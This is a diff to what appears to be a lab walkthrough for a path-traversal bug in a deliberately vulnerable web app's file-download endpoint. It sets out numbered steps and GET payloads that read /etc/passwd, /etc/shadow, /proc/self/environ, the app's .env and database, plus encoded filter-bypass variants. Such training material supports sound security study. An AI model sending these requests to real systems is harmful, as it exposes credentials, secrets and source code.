@@ -92,31 +92,39 @@ def download_file():
 
 **The bug**: `os.path.join('/uploads', '../../../etc/passwd')` resolves to `/etc/passwd` because Python's `os.path.join` does not sanitize traversal sequences.
 
-**Step 1 — Confirm vulnerability**:
-```
-GET /files/download?name=../../../etc/passwd
-```
-Expected: Contents of `/etc/passwd` returned as a download.
+**Step 1 — Understand the depth**:
+The upload directory is at: `/home/user/vuln-app/static/uploads/documents/`
+To reach the filesystem root (`/`), count the directory levels:
+`documents` → `uploads` → `static` → `vuln-app` → `user` → `home` → `/` = **6 levels**
+Therefore the payload needs **6 `../`** sequences.
 
-**Step 2 — Read application files**:
+**Step 2 — Confirm vulnerability**:
 ```
-GET /files/download?name=../../../home/user/vuln-app/app.py
-GET /files/download?name=../../../home/user/vuln-app/.env
-GET /files/download?name=../../../home/user/vuln-app/meridian.db
+GET /files/download?name=../../../../../../etc/passwd
+```
+Expected: Contents of `/etc/passwd` returned as a file download.
+
+**Step 3 — Read application files** (only 3 levels needed from documents/ to app root):
+```
+GET /files/download?name=../../../app.py
+GET /files/download?name=../../../.env
+GET /files/download?name=../../../meridian.db
+GET /files/download?name=../../../seed_data.py
 ```
 
-**Step 3 — Read system files**:
+**Step 4 — Read system files**:
 ```
-GET /files/download?name=../../../etc/shadow         (if low-privilege)
-GET /files/download?name=../../../proc/self/environ  (env vars, often has secrets)
-GET /files/download?name=../../../proc/self/cmdline  (running command)
+GET /files/download?name=../../../../../../etc/passwd
+GET /files/download?name=../../../../../../etc/shadow
+GET /files/download?name=../../../../../../proc/self/environ
+GET /files/download?name=../../../../../../proc/self/cmdline
 ```
 
 **URL-encoded variants** (if basic filtering exists):
 ```
-?name=..%2F..%2F..%2Fetc%2Fpasswd
-?name=....//....//....//etc/passwd
-?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+?name=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+?name=....//....//....//....//....//....//etc/passwd
+?name=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 ```
 
 **Impact**: Read any file readable by the web server process. Leads to credential disclosure, source code exposure, and potentially full system compromise via config/key theft.
